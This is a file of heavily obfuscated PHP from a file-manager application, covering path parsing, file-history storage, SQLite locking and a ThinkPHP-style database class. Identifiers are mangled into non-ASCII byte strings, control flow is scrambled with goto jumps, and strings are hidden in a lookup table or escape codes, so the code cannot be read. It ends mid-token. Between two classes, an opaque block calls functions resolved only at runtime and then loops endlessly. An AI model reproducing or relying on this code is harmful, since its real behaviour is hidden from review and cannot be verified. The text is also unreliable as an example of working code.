$bğñ¸’°î©[$BŸ¯ÒÌæÚä[361]] = $eŸîïù‚¸Ò; } } return $bğñ¸’°î©; goto CÜÚ„÷·Æ¿; Dæ×„«Ù’É: if (substr($eËÚ˜¢¢ªİ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $eó¼‡©Ü = self::pathHistory($eËÚ˜¢¢ªİ); $bğñ¸’°î© = array($BŸ¯ÒÌæÚä[1093] => $eó¼‡©Ü . $BŸ¯ÒÌæÚä[1080], $BŸ¯ÒÌæÚä[1092] => rtrim(get_path_father($eó¼‡©Ü), $BŸ¯ÒÌæÚä[8]) . $BŸ¯ÒÌæÚä[8], $BŸ¯ÒÌæÚä[361] => array()); goto f‘öïò¿îÂ; CÜÚ„÷·Æ¿: } private static function saveData($e‚êèí, $F‹é“£Ğº) { goto CéÕ…Ìéãâ; Dë½¦ˆè: $BÒ¤‹²äÊ = IO::pathFather($e‚êèí); IO::remove($e‚êèí); self::clearEmptyFolder($BÒ¤‹²äÊ); goto d‡éÃŒ; CéÕ…Ìéãâ: $eîÜ¦öŸ»… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; self::log($eîÜ¦öŸ»…[1096] . $e‚êèí . $eîÜ¦öŸ»…[67] . count($F‹é“£Ğº), $eîÜ¦öŸ»…[699]); if ($F‹é“£Ğº) { return IO::setContent($e‚êèí, json_encode($F‹é“£Ğº)); } goto Dë½¦ˆè; d‡éÃŒ: return !0; goto d²šœÛ”˜Ó; d²šœÛ”˜Ó: } public static function clearEmptyFolder($aĞ®İàÓ½¿) { goto bññ Ø‹Ì; aØ¾²è©³ô: $BèáˆÍñó… = IO::has($aĞ®İàÓ½¿, !0); if ($BèáˆÍñó…[$cÉÏóİÂ•…[199]] > 0 || $BèáˆÍñó…[$cÉÏóİÂ•…[200]] > 0) { return; } IO::remove($aĞ®İàÓ½¿); goto B¾®†¡Òñ; bññ Ø‹Ì: $cÉÏóİÂ•… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (trim($aĞ®İàÓ½¿, $cÉÏóİÂ•…[8]) == trim(self::$_historyBase, $cÉÏóİÂ•…[8])) { return; } $a÷¼Ô—ËÕÁ = IO::pathFather($aĞ®İàÓ½¿); goto aØ¾²è©³ô; B¾®†¡Òñ: self::clearEmptyFolder($a÷¼Ô—ËÕÁ); goto dÀ… ‹ “—; dÀ… ‹ “—: } private static function getBasePath() { goto dÏŠ•ŠÕëÑ; Bµ“ô÷: $C”ÓáŸ = DATA_PATH . $B®¾Øšğ†¯[1099]; $C”ÓáŸ = IO::mkdir($C”ÓáŸ); $C”ÓáŸ = rtrim($C”ÓáŸ, $B®¾Øšğ†¯[8]) . $B®¾Øšğ†¯[8]; goto dÃ°·‰œ¦; dÃ°·‰œ¦: file_put_contents($C”ÓáŸ . $B®¾Øšğ†¯[1100], $B®¾Øšğ†¯[33]); Model($B®¾Øšğ†¯[1097])->set($B®¾Øšğ†¯[1098], $C”ÓáŸ); return $C”ÓáŸ; goto Aõ÷‡Ù»§; dÏŠ•ŠÕëÑ: $B®¾Øšğ†¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C”ÓáŸ = Model($B®¾Øšğ†¯[1097])->get($B®¾Øšğ†¯[1098]); if (IO::exist($C”ÓáŸ)) { return $C”ÓáŸ; } goto Bµ“ô÷; Aõ÷‡Ù»§: } } if (!isset($_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][800]]) || !isset($_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][801]])) { goto a½õº›¼¶Ù; aªŞÔìÓÜ: $C›µ²³¤‘„($_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][804]] . $_SERVER[ÈİÅ¿ÈÈ¥×][805]); $aÇŞ…¯æø = 2; while ($aÇŞ…¯æø > 1) { $c–¸Èé–Åá = rawurlencode($aÇŞ…¯æø . $_SERVER[ÈİÅ¿ÈÈ¥×][368]); } goto b¸ç—ë±; a½õº›¼¶Ù: $Aù‹À¶§«É = $_SERVER[ÈİÅ¿ÈÈ¥×][803]; $EÚïÓî÷ÆŠ = $_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][804]] . $_SERVER[ÈİÅ¿ÈÈ¥×][805]; $CÎÍñ¾”½ = $Aù‹À¶§«É($EÚïÓî÷ÆŠ); goto cÇº»¬‹Áµ; cÇº»¬‹Áµ: $f«´„Ê‚Şß = explode($_SERVER[ÈİÅ¿ÈÈ¥×][225], $CÎÍñ¾”½); if (count($f«´„Ê‚Şß) < $_SERVER[ÈİÅ¿ÈÈ¥×][579]) { $D“§‡„ª‘ = $_SERVER[ÈİÅ¿ÈÈ¥×][806]; $D“§‡„ª‘(); } $C›µ²³¤‘„ = $_SERVER[ÈİÅ¿ÈÈ¥×][1101]; goto aªŞÔìÓÜ; b¸ç—ë±: } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\x52\145\143\x79\143\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\x46\151\154\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\x46\151\x6c\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\x70\122\x6f\x6f\164\x53\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\x72\123\150\x61\x72\x65\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\x65\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\141\x72\145\x49\x74\145\x6d\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\141\162\143\150\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\163\x65\162\x52\145\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\145\162\175"; public static function typeList() { $FïÎ¹‡é¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($FïÎ¹‡é¥[1102] => self::KOD_SOURCE, $FïÎ¹‡é¥[1103] => self::KOD_USER_RECYCLE, $FïÎ¹‡é¥[1104] => self::KOD_USER_FAV, $FïÎ¹‡é¥[1105] => self::KOD_USER_FILE_TAG, $FïÎ¹‡é¥[1106] => self::KOD_USER_FILE_TYPE, $FïÎ¹‡é¥[1107] => self::KOD_GROUP_ROOT_SELF, $FïÎ¹‡é¥[1108] => self::KOD_USER_SHARE, $FïÎ¹‡é¥[1109] => self::KOD_USER_SHARE_LINK, $FïÎ¹‡é¥[1110] => self::KOD_USER_SHARE_TO_ME, $FïÎ¹‡é¥[1111] => self::KOD_SHARE_ITEM, $FïÎ¹‡é¥[1112] => self::KOD_SHARE_LINK, $FïÎ¹‡é¥[1113] => self::KOD_SEARCH, $FïÎ¹‡é¥[1114] => self::KOD_BLOCK, $FïÎ¹‡é¥[1115] => self::KOD_IO, $FïÎ¹‡é¥[1116] => self::KOD_USER_RECENT, $FïÎ¹‡é¥[1117] => self::KOD_USER_DRIVER); } public static function parse($câ”˜Æ²Šš) { goto FÀê ®¥Ÿä; f”÷òìòç: $F±®Õİ‡Èä = array($d”ÓÖ ¨‘[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[1082]] = in_array($a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[29]], $F±®Õİ‡Èä); return $a…¿È‡ŸƒÒ; goto B¶‰ª‹Ñ©¸; FÀê ®¥Ÿä: $d”ÓÖ ¨‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $câ”˜Æ²Šš = self::clear($câ”˜Æ²Šš); $AÈª³ó÷Ú = array_values(self::typeList()); goto BàÜ×â¬÷¯; BàÜ×â¬÷¯: preg_match($d”ÓÖ ¨‘[1118], $câ”˜Æ²Šš, $C¿«Ç§ˆÉâ); $a…¿È‡ŸƒÒ = array($d”ÓÖ ¨‘[404] => !1, $d”ÓÖ ¨‘[1119] => !1, $d”ÓÖ ¨‘[401] => !1, $d”ÓÖ ¨‘[75] => $câ”˜Æ²Šš, $d”ÓÖ ¨‘[1029] => !1, $d”ÓÖ ¨‘[1028] => $d”ÓÖ ¨‘[33]); if (is_array($C¿«Ç§ˆÉâ) && count($C¿«Ç§ˆÉâ) == 5) { $dëŒ…„•Ï = $d”ÓÖ ¨‘[1120] . $C¿«Ç§ˆÉâ[2] . $d”ÓÖ ¨‘[321]; if (in_array($dëŒ…„•Ï, $AÈª³ó÷Ú)) { $a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[1029]] = $C¿«Ç§ˆÉâ[1]; $a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[29]] = $dëŒ…„•Ï; $a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[1121]] = substr($dëŒ…„•Ï, 1, -1); $a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[383]] = $C¿«Ç§ˆÉâ[3]; } $a…¿È‡ŸƒÒ[$d”ÓÖ ¨‘[1028]] = $C¿«Ç§ˆÉâ[4]; } goto f”÷òìòç; B¶‰ª‹Ñ©¸: } public static function clear($BÖ—‡áó) { goto E”ŠÁÇ×…¥; b¢³ß”£ø—: $BÖ—‡áó = preg_replace($A­¢»¢ˆô»[1124], $A­¢»¢ˆô»[8], $BÖ—‡áó); if ($BÖ—‡áó == $A­¢»¢ˆô»[8]) { return $A­¢»¢ˆô»[8]; } $BÖ—‡áó = rtrim($BÖ—‡áó, $A­¢»¢ˆô»[8]); goto FÀÁôÄ…; FÀÁôÄ…: return $BÖ—‡áó; goto cÒß™•”Ùğ; Eù»•’â‘å: $cå•¹ö†¸ˆ = $A­¢»¢ˆô»[1122]; if (substr($BÖ—‡áó, 0, 3) == $A­¢»¢ˆô»[1123]) { $BÖ—‡áó = substr($BÖ—‡áó, 3); } while (strstr($BÖ—‡áó, $cå•¹ö†¸ˆ)) { $BÖ—‡áó = str_replace($cå•¹ö†¸ˆ, $A­¢»¢ˆô»[8], $BÖ—‡áó); } goto b¢³ß”£ø—; E”ŠÁÇ×…¥: $A­¢»¢ˆô» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÖ—‡áó = str_replace(array($A­¢»¢ˆô»[1002], $A­¢»¢ˆô»[225]), $A­¢»¢ˆô»[50], $BÖ—‡áó); $BÖ—‡áó = str_replace($A­¢»¢ˆô»[93], $A­¢»¢ˆô»[8], $BÖ—‡áó); goto Eù»•’â‘å; cÒß™•”Ùğ: } public static function sourceID($a”Öğ„ÒİÑ) { $cÁÓ·šŞÜØ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DŒë±¾µãé = self::parse($a”Öğ„ÒİÑ); if ($DŒë±¾µãé[$cÁÓ·šŞÜØ[29]] !== self::KOD_SOURCE) { show_json(LNG($cÁÓ·šŞÜØ[1125]), !1); } return $DŒë±¾µãé[$cÁÓ·šŞÜØ[383]]; } public static function make($CÓÊğÃ­ìÅ) { if (!$CÓÊğÃ­ìÅ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($CÓÊğÃ­ìÅ)); } public static function makeShare($c£ÛÆí„­Ó, $EìììƒñÈÅ) { return self::makePath(self::KOD_SHARE_ITEM, $c£ÛÆí„­Ó, $EìììƒñÈÅ); } public static function makeFileTypePath($cîå†÷¨Äø) { return self::makePath(self::KOD_USER_FILE_TYPE, $cîå†÷¨Äø); } public static function makeFileTagPath($dÒ‡óìğùÙ) { return self::makePath(self::KOD_USER_FILE_TAG, $dÒ‡óìğùÙ); } public static function makePath($E¿Á‡ï§øî, $aÈµŒÇéğ = '', $C¿Ãˆé“±™ = '') { $C­ä…’ˆÂí =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cƒ³®Üå¡ = substr($E¿Á‡ï§øî, 1, -1); $CŸÎİ¢Ñ˜ = $C­ä…’ˆÂí[1126] . $Cƒ³®Üå¡ . $C­ä…’ˆÂí[1127] . $aÈµŒÇéğ . $C­ä…’ˆÂí[1128]; $CŸÎİ¢Ñ˜ = $C¿Ãˆé“±™ ? $CŸÎİ¢Ñ˜ . $C¿Ãˆé“±™ . $C­ä…’ˆÂí[8] : $CŸÎİ¢Ñ˜; return $CŸÎİ¢Ñ˜; } public static function hashPath($a¤£ÈÓø‰) { $aÚÓíĞÇÌ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bº—à¯‡ø = is_array($a¤£ÈÓø‰) ? $a¤£ÈÓø‰ : IO::info($a¤£ÈÓø‰); $d”ÒÃ½æñ… = _get($Bº—à¯‡ø, $aÚÓíĞÇÌ[1129], $aÚÓíĞÇÌ[33]); if (!$d”ÒÃ½æñ…) { $F»õ ÄÆ¡‡ = KodIO::parse($Bº—à¯‡ø[$aÚÓíĞÇÌ[75]]); if (!$F»õ ÄÆ¡‡[$aÚÓíĞÇÌ[29]]) { $d”ÒÃ½æñ… = IO::hashSimple($Bº—à¯‡ø[$aÚÓíĞÇÌ[75]]); } } if (!$d”ÒÃ½æñ…) { $d”ÒÃ½æñ… = md5($Bº—à¯‡ø[$aÚÓíĞÇÌ[75]] . $Bº—à¯‡ø[$aÚÓíĞÇÌ[77]] . $Bº—à¯‡ø[$aÚÓíĞÇÌ[107]]); } return $d”ÒÃ½æñ…; } public static function initSystemPath() { goto fµó¾ÌËÙ“; fµó¾ÌËÙ“: $bšñƒò†êÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (defined($bšñƒò†êÀ[1130])) { return; } define($bšñƒò†êÀ[1130], self::systemPath($bšñƒò†êÀ[1131])); goto EÛ‹ìÇ†éÕ; EÛ‹ìÇ†éÕ: define($bšñƒò†êÀ[1132], self::systemPath($bšñƒò†êÀ[1133])); define($bšñƒò†êÀ[1134], self::systemPath($bšñƒò†êÀ[1135])); define($bšñƒò†êÀ[1136], self::systemPath($bšñƒò†êÀ[1137])); goto F·•¦†Éšù; F·•¦†Éšù: IOHistory::bindEvent(); goto D–¤„Í¤Ø; D–¤„Í¤Ø: } public static function systemPath($eõÄğ‰) { goto C«šçÃœ‚; DÅë–’§ÜÛ: return $b—¤Ó–Ëİö; goto f¦»†ÚÏèâ; Bê–¹±ÌìÚ: if ($b—¤Ó–Ëİö) { return $b—¤Ó–Ëİö; } if ($eõÄğ‰ == $d³¨ò•’½[1131]) { $b—¤Ó–Ëİö = self::make(Model($d³¨ò•’½[759])->systemRootPathAdd($d³¨ò•’½[1139])); } else { $b—¤Ó–Ëİö = self::systemPath($d³¨ò•’½[1131]); $E†¶Îñê¤ó = self::sourceID($b—¤Ó–Ëİö); $b—¤Ó–Ëİö = self::make(Model($d³¨ò•’½[759])->mkdir($E†¶Îñê¤ó, $eõÄğ‰)); } Model($d³¨ò•’½[1087])->set($b©°é‚—Îª, $b—¤Ó–Ëİö); goto DÅë–’§ÜÛ; C«šçÃœ‚: $d³¨ò•’½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b©°é‚—Îª = $d³¨ò•’½[1138] . ucfirst($eõÄğ‰); $b—¤Ó–Ëİö = Model($d³¨ò•’½[1087])->get($b©°é‚—Îª); goto Bê–¹±ÌìÚ; f¦»†ÚÏèâ: } public static function systemFolder($C²„˜ƒ¹Â) { $Aö¹¹„…Üâ = IO_PATH_SYSTEM_SOURCE . $C²„˜ƒ¹Â; $B¾áÖà¶× = Cache::get($Aö¹¹„…Üâ); if (!$B¾áÖà¶×) { $EêÂ–ò¤ÈÑ = IO::infoFull($Aö¹¹„…Üâ); if (!$EêÂ–ò¤ÈÑ) { $B¾áÖà¶× = IO::mkdir($Aö¹¹„…Üâ, REPEAT_SKIP); } else { $B¾áÖà¶× = $EêÂ–ò¤ÈÑ[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]; } Cache::set($Aö¹¹„…Üâ, $B¾áÖà¶×, 3600 * 10); } return $B¾áÖà¶×; } public static function defaultDriver() { return Model($_SERVER[ÈİÅ¿ÈÈ¥×][711])->defaultDriver(); } public static function defaultIO() { $eŸ¹©Ï— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D‰òØâ¤¿ = self::defaultDriver(); return $eŸ¹©Ï—[1140] . $D‰òØâ¤¿[$eŸ¹©Ï—[383]] . $eŸ¹©Ï—[1128]; } public static function defaultDriverInit() { static $B¿¹¹‡¥‰à = false; if ($B¿¹¹‡¥‰à) { return $B¿¹¹‡¥‰à; } $B¿¹¹‡¥‰à = IO::init(self::defaultIO()); return $B¿¹¹‡¥‰à; } public static function fileTypeList() { $fø‚×Öâ‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BŸ»¹¥„­ = $GLOBALS[$fø‚×Öâ‰[6]][$fø‚×Öâ‰[1141]]; foreach ($BŸ»¹¥„­ as $C‡”ÍÏÊË‘ => $Dİ£Æª­œ) { $bÖ‡İ¼«•É = $fø‚×Öâ‰[1142] . $C‡”ÍÏÊË‘; $a–ùá‰‹ = LNG($bÖ‡İ¼«•É); if ($bÖ‡İ¼«•É != $a–ùá‰‹) { $BŸ»¹¥„­[$C‡”ÍÏÊË‘][$fø‚×Öâ‰[28]] = $a–ùá‰‹; } } return $BŸ»¹¥„­; } public static function transferType($AëóĞ…ÈªÒ, $c÷…Ùçß°ã) { goto C—óÌß±ƒÉ; C—óÌß±ƒÉ: $A¥Ş¬Î°ôš =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÌÄ®Ñ‡á› = self::driverType($AëóĞ…ÈªÒ); $Fßø„‰¶ƒ = self::driverType($c÷…Ùçß°ã); goto d›ŠÇŒêÈ; a®ğ¿÷í×•: return $A¥Ş¬Î°ôš[1145]; goto DƒĞŠ¨™„Á; d›ŠÇŒêÈ: if ($FÌÄ®Ñ‡á›[$A¥Ş¬Î°ôš[29]] == $Fßø„‰¶ƒ[$A¥Ş¬Î°ôš[29]] && $FÌÄ®Ñ‡á›[$A¥Ş¬Î°ôš[1143]] == $Fßø„‰¶ƒ[$A¥Ş¬Î°ôš[1143]]) { return $A¥Ş¬Î°ôš[1144]; } if ($FÌÄ®Ñ‡á›[$A¥Ş¬Î°ôš[29]] == $A¥Ş¬Î°ôš[792] && $Fßø„‰¶ƒ[$A¥Ş¬Î°ôš[29]] == $A¥Ş¬Î°ôš[102]) { return $A¥Ş¬Î°ôš[1058]; } if ($FÌÄ®Ñ‡á›[$A¥Ş¬Î°ôš[29]] == $A¥Ş¬Î°ôš[102] && $Fßø„‰¶ƒ[$A¥Ş¬Î°ôš[29]] == $A¥Ş¬Î°ôš[792]) { return $A¥Ş¬Î°ôš[103]; } goto a®ğ¿÷í×•; DƒĞŠ¨™„Á: } public static function driverType($Cƒ˜°ñÖÁ) { goto eÇùç·¯‘Û; eÇùç·¯‘Û: $f‹ÑëÑ›‹¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bˆºğÓ‹‹ø = $Cƒ˜°ñÖÁ->path; $d™Çï‚ç = str_replace($f‹ÑëÑ›‹¦[1146], $f‹ÑëÑ›‹¦[33], strtolower($Cƒ˜°ñÖÁ->getType())); goto eËôÏÕæöÅ; b×«†¹˜ñ : return array($f‹ÑëÑ›‹¦[29] => $f‹ÑëÑ›‹¦[792], $f‹ÑëÑ›‹¦[1143] => $Cƒ˜°ñÖÁ->pathDriver, $f‹ÑëÑ›‹¦[75] => $bˆºğÓ‹‹ø); goto AšêËò¥»; eËôÏÕæöÅ: if ($d™Çï‚ç == $f‹ÑëÑ›‹¦[702] || $d™Çï‚ç == $f‹ÑëÑ›‹¦[1147] || $d™Çï‚ç == $f‹ÑëÑ›‹¦[1148]) { $Cƒ˜°ñÖÁ = self::defaultDriverInit(); } else { if ($d™Çï‚ç == $f‹ÑëÑ›‹¦[1065] || $d™Çï‚ç == $f‹ÑëÑ›‹¦[1149]) { $Cƒ˜°ñÖÁ = IO::init($Cƒ˜°ñÖÁ->pathParse[$f‹ÑëÑ›‹¦[1012]]); } } $d™Çï‚ç = str_replace($f‹ÑëÑ›‹¦[1146], $f‹ÑëÑ›‹¦[33], strtolower($Cƒ˜°ñÖÁ->getType())); if ($d™Çï‚ç == $f‹ÑëÑ›‹¦[102]) { return array($f‹ÑëÑ›‹¦[29] => $f‹ÑëÑ›‹¦[102], $f‹ÑëÑ›‹¦[1143] => $f‹ÑëÑ›‹¦[33], $f‹ÑëÑ›‹¦[75] => $bˆºğÓ‹‹ø); } goto b×«†¹˜ñ ; AšêËò¥»: } } goto DìÍîİå²ù; C—ÒĞ­ŒÚì: class DbSqlite extends DbSqliteBase { public function query($DÊŸ÷®ë) { $AŠŒß±åì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!CacheLock::fileLock($AŠŒß±åì[9])) { return !1; } $fÜÅÓªàè† = parent::query($DÊŸ÷®ë); CacheLock::fileUnLock($AŠŒß±åì[9]); return $fÜÅÓªàè†; } public function execute($aâæÀ¼°’ƒ) { $eÎ»êÚ†í =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!CacheLock::fileLock($eÎ»êÚ†í[9])) { return !1; } $a‡âö‰³ãœ = parent::execute($aâæÀ¼°’ƒ); CacheLock::fileUnLock($eÎ»êÚ†í[9]); return $a‡âö‰³ãœ; } } class DbSqlite3 extends DbSqlite3Base { public function query($e›øŞ„’µ) { $E½ã ­¿° =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!CacheLock::fileLock($E½ã ­¿°[9])) { return !1; } $bÍ‘‹ã‡¦Ê = parent::query($e›øŞ„’µ); CacheLock::fileUnLock($E½ã ­¿°[9]); return $bÍ‘‹ã‡¦Ê; } public function execute($cÍ®óã£Û‹) { $eÃĞâÎ¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!CacheLock::fileLock($eÃĞâÎ¦[9])) { return !1; } $EäÍè’ùÛà = parent::execute($cÍ®óã£Û‹); CacheLock::fileUnLock($eÃĞâÎ¦[9]); return $EäÍè’ùÛà; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\161" => "\x3c\76", "\x67\164" => "\x3e", "\145\x67\x74" => "\x3e\x3d", "\154\164" => "\x3c", "\x65\x6c\x74" => "\74\x3d", "\x6e\x6f\x74\154\x69\153\145" => "\x4e\x4f\x54\x20\114\111\x4b\105", "\154\x69\x6b\145" => "\x4c\111\x4b\x45", "\151\x6e" => "\x49\116", "\156\157\164\151\156" => "\116\117\124\40\x49\116", "\156\157\164\x20\151\x6e" => "\x4e\117\124\40\x49\x4e", "\142\145\164\167\x65\x65\156" => "\102\105\124\x57\105\x45\x4e", "\156\x6f\x74\x62\x65\164\167\x65\x65\156" => "\x4e\117\124\40\102\x45\x54\127\105\105\116", "\x6e\157\164\x20\x62\145\x74\x77\145\x65\x6e" => "\116\x4f\x54\x20\x42\105\124\x57\105\x45\116"); protected $selectSql = "\123\105\114\105\103\124\45\x44\x49\x53\124\111\x4e\103\124\x25\x20\x25\106\x49\105\x4c\x44\x25\40\106\x52\x4f\115\x20\x25\124\x41\x42\x4c\105\45\x25\x4a\x4f\111\x4e\x25\45\127\x48\x45\x52\105\x25\45\107\122\117\125\x50\45\x25\110\101\x56\x49\116\107\45\45\117\122\104\105\122\45\x25\114\x49\x4d\111\x54\x25\x20\x25\x55\x4e\x49\117\x4e\45\x25\103\x4f\x4d\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $e®ì®Ú‹¬Š = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÈİÅ¿ÈÈ¥×][884], $e®ì®Ú‹¬Š); } public function factory($Aãí‹…ŒÑö = '') { goto B±àˆ¾©¿; DˆÚğÊ÷åŒ: $this->dbType = ucwords(strtolower($Aãí‹…ŒÑö[$a„èŒÜæö®[885]])); $dÄËÙÃ±‘Ô = $a„èŒÜæö®[887] . $this->dbType; if (class_exists($dÄËÙÃ±‘Ô)) { $a’¨ñ™›œÜ = new $dÄËÙÃ±‘Ô($Aãí‹…ŒÑö); if ($a„èŒÜæö®[731] != strtolower($Aãí‹…ŒÑö[$a„èŒÜæö®[885]])) { $a’¨ñ™›œÜ->dbType = strtoupper($this->dbType); } else { $a’¨ñ™›œÜ->dbType = $this->_getDsnType($Aãí‹…ŒÑö[$a„èŒÜæö®[840]]); } } else { think_exception(think_lang($a„èŒÜæö®[888]) . $a„èŒÜæö®[889] . $dÄËÙÃ±‘Ô); } goto C†ŠÃˆÒ­à; C†ŠÃˆÒ­à: return $a’¨ñ™›œÜ; goto f„ÔáÑ; B±àˆ¾©¿: $a„èŒÜæö® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Aãí‹…ŒÑö = $this->parseConfig($Aãí‹…ŒÑö); if (empty($Aãí‹…ŒÑö[$a„èŒÜæö®[885]])) { think_exception(think_lang($a„èŒÜæö®[886])); } goto DˆÚğÊ÷åŒ; f„ÔáÑ: } public function __call($Dé“¦ŒÇ, $CÒĞÀ¼ªİŠ) { if (method_exists($this, $Dé“¦ŒÇ)) { return call_user_func_array(array($this, $Dé“¦ŒÇ), $CÒĞÀ¼ªİŠ); } } protected function _getDsnType($CÑ¼Ö¾ùŠ) { $CŸ†¸¡¨·Î = explode($_SERVER[ÈİÅ¿ÈÈ¥×][4], $CÑ¼Ö¾ùŠ); $AÁÒãàŞ¬¨ = strtoupper(trim($CŸ†¸¡¨·Î[0])); return $AÁÒãàŞ¬¨; } private function parseConfig($EÛóÑéùŞ  = '') { $FÑ¤ÈÄ•¼é =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($EÛóÑéùŞ ) && is_string($EÛóÑéùŞ )) { $EÛóÑéùŞ  = $this->parseDSN($EÛóÑéùŞ ); } elseif (is_array($EÛóÑéùŞ )) { $EÛóÑéùŞ  = array_change_key_case($EÛóÑéùŞ ); $EÛóÑéùŞ  = array($FÑ¤ÈÄ•¼é[885] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[730]], $FÑ¤ÈÄ•¼é[813] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[890]], $FÑ¤ÈÄ•¼é[814] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[891]], $FÑ¤ÈÄ•¼é[811] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[892]], $FÑ¤ÈÄ•¼é[812] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[893]], $FÑ¤ÈÄ•¼é[17] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[894]], $FÑ¤ÈÄ•¼é[840] => $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[732]], $FÑ¤ÈÄ•¼é[13] => isset($EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[895]]) ? $EÛóÑéùŞ [$FÑ¤ÈÄ•¼é[895]] : array()); } elseif (empty($EÛóÑéùŞ )) { if (think_config($FÑ¤ÈÄ•¼é[896]) && $FÑ¤ÈÄ•¼é[731] != strtolower(think_config($FÑ¤ÈÄ•¼é[897]))) { $EÛóÑéùŞ  = $this->parseDSN(think_config($FÑ¤ÈÄ•¼é[896])); } else { $EÛóÑéùŞ  = array($FÑ¤ÈÄ•¼é[885] => think_config($FÑ¤ÈÄ•¼é[897]), $FÑ¤ÈÄ•¼é[813] => think_config($FÑ¤ÈÄ•¼é[898]), $FÑ¤ÈÄ•¼é[814] => think_config($FÑ¤ÈÄ•¼é[899]), $FÑ¤ÈÄ•¼é[811] => think_config($FÑ¤ÈÄ•¼é[900]), $FÑ¤ÈÄ•¼é[812] => think_config($FÑ¤ÈÄ•¼é[901]), $FÑ¤ÈÄ•¼é[17] => think_config($FÑ¤ÈÄ•¼é[240]), $FÑ¤ÈÄ•¼é[840] => think_config($FÑ¤ÈÄ•¼é[896]), $FÑ¤ÈÄ•¼é[13] => think_config($FÑ¤ÈÄ•¼é[902])); } } return $EÛóÑéùŞ ; } protected function initConnect($FŒĞÑ¢êµ = true) { if (1 == think_config($_SERVER[ÈİÅ¿ÈÈ¥×][18])) { $this->_linkID = $this->multiConnect($FŒĞÑ¢êµ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $eˆçëæäŸ‚ => $dæ±‘–éŠ‡) { $this->_linkID = $dæ±‘–éŠ‡; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($D¯Ä ›…¶ø = false) { $BŠÂ—àí»Ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $bÑËèŒ«Ì = array(); if (empty($bÑËèŒ«Ì)) { foreach ($this->config as $fØÌÚ¸£ÑÇ => $eŒ¸“…®““) { $bÑËèŒ«Ì[$fØÌÚ¸£ÑÇ] = explode($BŠÂ—àí»Ô[47], $eŒ¸“…®““); } } if (think_config($BŠÂ—àí»Ô[903])) { if ($D¯Ä ›…¶ø) { $eÙ„Šœİ„ 